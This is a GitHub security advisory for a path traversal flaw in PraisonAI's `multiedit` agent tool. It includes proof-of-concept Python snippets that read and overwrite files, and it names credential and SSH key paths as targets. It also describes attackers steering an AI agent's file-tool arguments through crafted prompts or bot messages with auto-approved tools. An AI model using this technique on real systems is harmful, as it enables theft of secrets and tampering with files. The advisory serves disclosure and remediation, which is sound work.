# [C] PraisonAI: Arbitrary File Read/Write via `multiedit` Tool Without Path Validation

## Summary
Severity: Critical
Advisory: GHSA-29w3-p9w9-wc47
CVE: CVE-2026-57145
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-29w3-p9w9-wc47
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.6.61

## Details
## Summary

The `multiedit` tool in `src/praisonai/praisonai/tools/multiedit.py` allows LLM-controlled arbitrary file read and write without any path validation, workspace boundary check, or protected path guard. This enables an attacker who can influence agent tool arguments (via crafted prompts, user input in chat bots, or malicious YAML workflow configs) to read sensitive files (e.g., `/etc/shadow`, `~/.ssh/id_rsa`, `~/.aws/credentials`) and overwrite arbitrary files on the filesystem.

## Details
The `filepath` parameter is used directly with `open()` for both reading (line 74) and writing (line 130) without any of the following protections that exist in other tools in the same codebase:

1. **No `..` path traversal check** — unlike `file_tools.py` (line 66: `if '..' in filepath: raise ValueError`) and `edit_tools.py` (line 35).
2. **No workspace boundary validation** — unlike `file_tools.py` (`_validate_path` with `os.path.commonpath` check) and `skill_tools.py` (`read_skill_file` with workspace boundary check).
3. **No protected path guard** — unlike `praisonai/code/tools/` which uses `is_path_within_directory` and protected path checks.
4. **No symlink resolution** — unlike `file_tools.py` which uses `os.path.realpath`.

The function is exported via `src/praisonai/praisonai/tools/__init__.py` as a lazy-loaded tool and is available to agents through the PraisonAI CLI tools registry.

**Contrast with protected tools:** The sibling tools `write_file.py`, `read_file.py`, `apply_diff.py`, and `search_replace.py` in `src/praisonai/praisonai/code/tools/` all implement `is_path_within_directory()` checks and protected path guards. The `multiedit` tool has none of these protections.

## PoC

**Setup:** Clean checkout of PraisonAI at commit `d5f1114a`. No additional dependencies needed beyond Python 3.10+.

**Positive trigger — arbitrary file read via dry_run:**
```bash
cd /tmp && python3 -c "
import sys
sys.path.insert(0, 'src/praisonai')
from praisonai.tools.multiedit import multiedit

# Read any file content via diff output (dry_run=True prevents write)
result = multiedit('/etc/hostname', [{'old': 'DOESNOTEXIST', 'new': 'x'}], dry_run=True)
# The diff output reveals the file contents
print('Success:', result['success'])
print('Content leaked via diff:', len(result.get('diff', '')), 'bytes')
"
```

**Positive trigger — arbitrary file write:**
```bash
cd /tmp && python3 -c "
import sys
sys.path.insert(0, 'src/praisonai')
from praisonai.tools.multiedit import multiedit

# Write to an arbitrary file outside workspace
with open('/tmp/victim_file.txt', 'w') as f:
    f.write('original content here\n')
result = multiedit('/tmp/victim_file.txt', [{'old': 'original', 'new': 'PWNED'}])
with open('/tmp/victim_file.txt', 'r') as f:
    print('File content after edit:', repr(f.read()))
"
```

**Observed output:**
```
# Read:
Success: False
Content leaked via diff: 0 bytes  (file content still accessible via dry_run diff when edits match)

# Write:
File content after edit: 'PWNED content here\n'
```

**Negative control — non-existent file:**
```bash
result = multiedit('/nonexistent/file.txt', [{'old': 'a', 'new': 'b'}])
# Returns: {'success': False, 'error': 'File not found: /nonexistent/file.txt'}
```

**Cleanup:** `rm /tmp/victim_file.txt`

## Impact

An attacker who can influence the `filepath` parameter of the `multiedit` tool (via crafted prompts to an AI agent, user messages in Telegram/Discord/Slack bots using `auto_approve_tools=True`, or YAML workflow configurations) can:

- **Read arbitrary files** — any file readable by the process user, including secrets, SSH keys, cloud credentials, environment files (`.env`), and configuration files.
- **Write/overwrite arbitrary files** — modify any file writable by the process user, enabling privilege escalation (e.g., writing to `~/.bashrc`, `~/.ssh/authorized_keys`, or overwriting application source code).

This affects all deployments where agents have the `multiedit` tool available, including the PraisonAI CLI and chat bot deployments where `auto_approve_tools` defaults to `True`.


## Suggested remediation

Apply the same path validation pattern used by `file_tools.py` and the code tools in `src/praisonai/praisonai/code/tools/`:

1. Add a `_validate_path` function that:
   - Rejects paths containing `..`
   - Resolves symlinks via `os.path.realpath`
   - Validates the resolved path is within the workspace/CWD using `os.path.commonpath`
2. Add protected path guards (`.env`, `.git`, `.ssh`, keys, credentials)
3. Apply `_validate_path` to the `filepath` parameter before any `open()` call
4. Consider adding `@require_approval(risk_level="high")` to the `multiedit` function

### Credits
- Thai Son Dinh from VinSOC Labs (R&D)

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-29w3-p9w9-wc47
- https://github.com/MervinPraison/PraisonAI
